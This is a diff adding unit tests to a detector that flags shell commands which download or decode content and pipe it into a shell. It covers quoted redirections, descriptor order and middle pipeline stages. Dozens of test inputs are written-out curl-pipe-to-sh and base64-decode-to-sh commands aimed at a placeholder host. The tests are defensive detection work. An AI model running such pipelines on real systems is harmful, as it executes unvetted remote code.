@@ -424,6 +424,76 @@ describe("R2 download and execute", () => {
     expectNotRule("encoded-execution", ["base64 -d p.b64 2>/dev/null | sh < local.sh"]);
   });
 
+  // Codex P2 4366470074: an unquoted operator with a quoted target is still a redirection.
+  it("quoted redirection targets keep their redirection", () => {
+    // stderr target quoted: sh still reads the pipe.
+    expectRule("download-execute", [
+      'curl https://example.invalid/i | sh 2>"/dev/null"',
+      "curl https://example.invalid/i | sh 2>'/dev/null'",
+      'curl https://example.invalid/i | bash >"out log.txt" 2>&1',
+      'curl https://example.invalid/i | sh 2> "/dev/null"', // separate quoted target
+      'curl https://example.invalid/i 2>"err.log" | sh',
+    ]);
+    expectRule("encoded-execution", ['base64 -d p.b64 | sh 2>"/dev/null"']);
+    // stdout target quoted: the download goes to the file.
+    expectNotRule("download-execute", [
+      'curl https://example.invalid/i >"setup.sh" | sh',
+      "curl https://example.invalid/i >'setup.sh' | sh",
+      'curl https://example.invalid/i > "setup.sh" | sh',
+      'curl https://example.invalid/i >>"$HOME/log" | sh',
+      'curl https://example.invalid/i &>"all.log" | sh',
+    ]);
+    expectNotRule("encoded-execution", ['base64 -d p.b64 >"decoded.sh" | sh']);
+    // stdin target quoted: sh reads the file.
+    expectNotRule("download-execute", ['curl https://example.invalid/i | sh <"local.sh"', "curl https://example.invalid/i | sh < 'local.sh'"]);
+  });
+
+  it("quoted or escaped operators are ordinary text, not redirections", () => {
+    // The quoted word is then sh's script name: no claim.
+    expectNotRule("download-execute", [
+      'curl https://example.invalid/i | sh "2>/dev/null"',
+      'curl https://example.invalid/i | sh "2>"/dev/null',
+      "curl https://example.invalid/i | sh 2\\>/dev/null",
+      "curl https://example.invalid/i | sh \\>out",
+    ]);
+    // A quoted operator on the downloader is just an argument: stdout still reaches the pipe.
+    expectRule("download-execute", ['curl https://example.invalid/i ">setup.sh" | sh', "curl https://example.invalid/i '>' setup.sh | sh"]);
+  });
+
+  it("descriptor order still holds with quoted targets", () => {
+    expectNotRule("download-execute", [
+      'curl https://example.invalid/i 2>&1 >"setup.sh" | sh', // stderr to the pipe, the download to the file
+      'curl https://example.invalid/i >"setup.sh" 3>&1 | sh', // fd 3 copies the file target; fd 1 stays on it
+      'curl https://example.invalid/i 2>"err.log" 1>&2 | sh', // fd 1 copies fd 2, which is the file
+    ]);
+    expectRule("download-execute", ['curl https://example.invalid/i 3>"x.log" 2>&1 | sh']); // fd 1 untouched: still the pipe
+  });
+
+  // Codex P2 4366470076: a middle stage that reads another input passes nothing on.
+  it("a middle stage replacing its stdin stops the content", () => {
+    expectNotRule("download-execute", [
+      "curl https://example.invalid/i | cat </dev/null | sh",
+      "curl https://example.invalid/i | cat < /dev/null | sh",
+      'curl https://example.invalid/i | cat <"local.sh" | sh',
+      "curl https://example.invalid/i | grep . <<<'echo hi' | bash",
+      "curl https://example.invalid/i | cat <&3 | sh",
+      "curl https://example.invalid/i | cat 0</dev/null | sh",
+    ]);
+    expectNotRule("encoded-execution", ["base64 -d p.b64 | cat </dev/null | sh", "echo SGVsbG8= | base64 -d | cat < /dev/null | bash"]);
+  });
+
+  it("middle stages that keep reading the pipe still pass the content on", () => {
+    expectRule("download-execute", [
+      "curl https://example.invalid/i | cat | sh",
+      "curl https://example.invalid/i | cat 2>/dev/null | sh", // only stderr redirected
+      "curl https://example.invalid/i | grep -v '^#' 2>err.log | sh",
+      "curl https://example.invalid/i | tee copy.sh | sh", // tee writes a copy and passes it on
+    ]);
+    expectRule("encoded-execution", ["base64 -d p.b64 | cat 2>/dev/null | sh", "base64 -d p.b64 | cat | bash"]);
+    // A middle stage redirecting its stdout still stops it.
+    expectNotRule("download-execute", ["curl https://example.invalid/i | cat > out.sh | sh"]);
+  });
+
   // Codex P2 4366418874 (acknowledged limitation): shell control flow isn't parsed.
   // The control word is read as the program, so commands inside if/then, for/do,
   // while/do aren't interpreted. The scope note says so. If control flow is ever
